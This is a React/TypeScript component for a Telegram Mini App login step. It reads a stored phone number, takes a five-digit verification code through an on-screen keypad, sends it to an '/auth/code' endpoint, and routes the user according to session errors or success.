import { useEffect, useRef, useState } from "react";
import BackButton from "../../Components/BackButton";
import Keyboard from "../../Components/UI/Keyboard";
import MobilePC from "../../assets/mobile&PC.png";
import useFetch from "../../Hook/useFetch";
import useCloudTelegram from "../../Hook/useCloudTelegram";
import { useNavigate } from "react-router-dom";
import { useLanguage } from "../../Hook/useLanguage";
import useErrorStore from "../../Hook/useErrorStore";

function Code() {
  const Navigate = useNavigate();
  const sentRef = useRef<boolean>(false);
  const { t, ready } = useLanguage("Code");
  const [isIndex, setIndex] = useState<number>(0);
  const [isPhone, setPhone] = useState<string>("");
  const showError = useErrorStore((state) => state.showError);
  const { loading, error, data, useData } = useFetch("/auth/code");
  const [isNumber, setNumber] = useState<string[]>(Array(5).fill(""));

  useEffect(() => {
    const isValid = isNumber.filter(Boolean).length === 5;

    if (!isValid) {
      sentRef.current = false;
      return;
    }

    if (loading || sentRef.current) return;

    sentRef.current = true;
    (async () => {
      if (!isPhone?.trim()) return Navigate("/auth/login");
      const body = { code: isNumber.join(""), phone: isPhone };
      await useData({ body });
    })();
  }, [loading, isNumber, isPhone]);

  useEffect(() => {
    (async () => {
      const saved = await useCloudTelegram.getItems(["login_phone"]);
      if (!saved?.login_phone?.trim()) return Navigate("/auth/login");
      setPhone(saved?.login_phone);
    })();
  }, []);

  useEffect(() => {
    if (!error) return;

    const noResetErrors = [
      "no-auth",
      "AUTH_RESTART",
      "SESSION_NOT_FOUND",
      "SESSION_CORRUPTED",
      "SESSION_PASSWORD_NEEDED",
    ];
    const isNoReset = !noResetErrors.includes(error);

    if (error === "SESSION_PASSWORD_NEEDED") {
      Navigate("/auth/authenticator");
      return;
    }

    if (error === "no-auth") {
      (async () => await useCloudTelegram.removeItem("login_phone"))();
      const timerout = setTimeout(() => window.Telegram?.WebApp?.close(), 3000);
      return () => clearTimeout(timerout);
    }

    showError(t(error));

    const ErrorMod = ["AUTH_RESTART", "SESSION_NOT_FOUND", "SESSION_CORRUPTED"];
    if (ErrorMod.includes(error)) {
      (async () => await useCloudTelegram.removeItem("login_phone"))();
      const timeOut = setTimeout(() => Navigate("/auth/login"), 3000);
      return () => clearTimeout(timeOut);
    }

    if (isNoReset) {
      setIndex(0);
      sentRef.current = false;
      setNumber(Array(5).fill(""));
    }
  }, [error]);

  useEffect(() => {
    if (!data?.success) return;
    (async () => await useCloudTelegram.removeItem("login_phone"))();
    Navigate("/my-accounts");
  }, [data]);

  BackButton({
    link: "/auth/login",
    onClick: async () => {
      await useCloudTelegram.removeItem("login_phone");
    },
  });

  if (ready || !isPhone?.trim()) {
    return (
      <div className="size-full max-h-145 flex flex-col items-center">
        <div className="flex-1 flex-center flex-col">
          <div className="h-20 w-30 rounded-lg loader-animation"></div>
          <div className="h-5 w-50 loader-animation my-3 rounded-xl"></div>
          <div className="h-3.5 w-70 loader-animation rounded-xl"></div>
          <div className="h-3.5 w-55 loader-animation rounded-xl my-2"></div>
          <div className="grid grid-cols-5 gap-1.5 mt-3">
            {[1, 2, 3, 4, 5].map((index) => {
              return (
                <button
                  key={index}
                  type="button"
                  className="h-10 w-9 loader-animation rounded-lg"
                ></button>
              );
            })}
          </div>
        </div>

        <div className="grid grid-cols-3 w-full max-w-90 gap-1.5 mb-5">
          {[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12].map((index) => {
            return (
              <button
                key={index}
                type="button"
                className={`h-10 loader-animation ${index === 10 ? "invisible" : index === 1 ? "rounded-tl-3xl" : index === 3 ? "rounded-tr-3xl" : index === 12 ? "rounded-br-3xl" : ""} rounded-lg`}
              ></button>
            );
          })}
        </div>
      </div>
    );
  }

  return (
    <div className="h-145 w-full flex flex-col items-center justify-center">
      <div className="flex flex-col flex-1 items-center justify-center">
        <img src={MobilePC} alt="Mobile & PC" className="size-35" />

        <h1 className="text-white text-[17px] font-medium">{t("h1")}</h1>
        <p className="text-sm text-center max-w-90 my-2">
          {t("p").replace("phone", isPhone)}
        </p>

        <div className="grid grid-cols-5 gap-2 mt-3">
          {isNumber.map((item, index) => (
            <div
              key={index}
              onClick={() => setIndex(index)}
              className={`border-2 ${isIndex === index ? "border-button-color" : "border-input-color"} h-10 w-9 rounded-sm flex-center text-white text-[17px] font-medium cursor-pointer`}
            >
              {item}
            </div>
          ))}
        </div>
      </div>

      <Keyboard
        code={isNumber}
        setNumber={(index, value) => {
          setIndex(index);
          setNumber(value);
        }}
        index={isIndex}
        length={5}
        status={loading}
      />
    </div>
  );
}

export default Code;
